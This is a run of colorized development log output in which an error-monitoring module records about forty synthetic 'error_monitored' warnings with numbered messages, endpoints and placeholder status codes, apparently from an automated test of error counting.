WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768876Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1538'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768923Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1539'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1540'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769020Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1541'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769069Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1542'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769117Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1543'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769164Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1544'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769212Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1545'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769259Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1546'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769307Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1547'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769356Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1548'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769403Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1549'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769452Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1550'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769552Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1551'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769623Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1552'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769680Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1553'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769736Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1554'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769786Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1555'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769835Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1556'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769889Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1557'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769940Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1558'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.769990Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1559'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770038Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1560'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770086Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1561'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770135Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1562'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770186Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1563'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770295Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1564'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770369Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1565'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770423Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1566'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770474Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1567'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770523Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1568'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770572Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1569'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770620Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1570'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770670Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1571'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770721Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1572'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770774Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1573'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770825Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1574'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770874Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1575'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770923Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1576'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.770971Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m32[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1577'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
